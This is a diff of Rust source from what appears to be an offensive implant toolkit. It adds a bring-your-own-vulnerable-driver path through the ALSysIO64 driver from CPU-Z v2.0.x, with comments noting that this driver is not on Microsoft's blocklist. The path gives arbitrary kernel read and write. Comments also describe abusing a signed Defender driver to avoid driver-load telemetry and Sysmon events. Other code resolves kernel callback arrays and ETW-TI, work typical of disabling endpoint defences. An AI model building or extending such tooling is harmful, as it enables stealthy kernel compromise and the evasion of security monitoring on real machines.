@@ -27,27 +27,31 @@
 
 #![cfg(target_os = "windows")]
 
+/// ALSysIO64 (CPUID CPU-Z v2.0.x) phys-mode bootstrap — second clean phys
+/// BYOVD path alongside WDT. See `byovd_drivers/alsysio.rs` for the version
+/// pin (v2.1.0.0 removed the R/W IOCTLs).
+pub mod alsys;
+/// Real T4-T5 kernel assessment (module enumeration + code integrity +
+/// callback arrays + ETW-TI probe) over a live `KernelRw` — the
+/// operator-side replacement for the implant's user-mode T-REX kernel stubs.
+pub mod assess;
 pub mod driver_load;
 pub mod kernel_base;
 /// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
 /// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
 /// file drop or driver load. No blocklist signature, no Sysmon EID 6.
 pub mod ksld;
+pub mod pagewalk;
+pub mod pattern_scan;
 /// PeekabooProbe production seam — user-mode client for the signed probe
 /// driver (`tools/peekaboo-probe/`): handshake + status/track IOCTLs, loaded
 /// via `driver_load`. Supplies the live `PeekabooProbe` that makes the
 /// offset-free `PeekabooWindow` (tier 1 of `select_pg_window_with_probe`)
 /// reachable in production.
 pub mod peekaboo;
-pub mod pagewalk;
-pub mod pattern_scan;
 pub mod resolve;
 pub mod va_rw;
 pub mod wdt;
-/// Real T4-T5 kernel assessment (module enumeration + code integrity +
-/// callback arrays + ETW-TI probe) over a live `KernelRw` — the
-/// operator-side replacement for the implant's user-mode T-REX kernel stubs.
-pub mod assess;
 
 use crate::byovd::{ByovdDriver, VulnDriverIoctl};
 use crate::byovd_drivers::Shield;
@@ -72,6 +76,14 @@ pub enum KernelBootstrap {
     /// wrapped by a CR3-discovered VA→PA walk ([`wdt::bootstrap_wdt`]).
     /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
     Wdt(driver_load::LoadedDriver, va_rw::VaKernelRw<wdt::WdtPhys>),
+    /// ALSysIO64 phys mode — clean BYOVD (CPUID CPU-Z v2.0.x, not on the
+    /// blocklist; v2.1.0.0 lacks the R/W IOCTLs — do not use). Same
+    /// CR3-scan + VA→PA composition as Wdt ([`alsys::bootstrap_alsys`]).
+    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
+    Alsys(
+        driver_load::LoadedDriver,
+        va_rw::VaKernelRw<alsys::AlsysPhys>,
+    ),
 }
 
 impl KernelBootstrap {
@@ -81,6 +93,7 @@ impl KernelBootstrap {
             KernelBootstrap::KslD(d) => d,
             KernelBootstrap::Byovd(_, d) => d,
             KernelBootstrap::Wdt(_, rw) => rw,
+            KernelBootstrap::Alsys(_, rw) => rw,
         }
     }
 }
@@ -371,12 +384,11 @@ pub fn resolve_offsets(
     // byte-identical `4C 8D 35` encoding, so a first-match scan aliases them
     // to the same RVA — the historical bug. Range-filtered resolution picks
     // each array's own reference site.
-    let resolve_notify =
-        |site: &pattern_scan::RefSite, range: core::ops::Range<u32>| -> usize {
-            pattern_scan::resolve_rva_in_range(&image, site, range)
-                .map(|rva| base + rva as usize)
-                .unwrap_or(0)
-        };
+    let resolve_notify = |site: &pattern_scan::RefSite, range: core::ops::Range<u32>| -> usize {
+        pattern_scan::resolve_rva_in_range(&image, site, range)
+            .map(|rva| base + rva as usize)
+            .unwrap_or(0)
+    };
 
     let process_kva = resolve_notify(
         &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
@@ -635,6 +647,10 @@ pub fn assemble_tier(
             // page-walks the discovered System CR3 to expose the standard
             // `KernelRw` VA contract. The loaded driver is retained for
             // explicit cleanup.
+            (Box::new(rw), Some(Box::new(loaded)))
+        }
+        KernelBootstrap::Alsys(loaded, rw) => {
+            // Same phys→VA composition as Wdt, over `VaKernelRw<AlsysPhys>`.
             (Box::new(rw), Some(Box::new(loaded)))
         }
     };
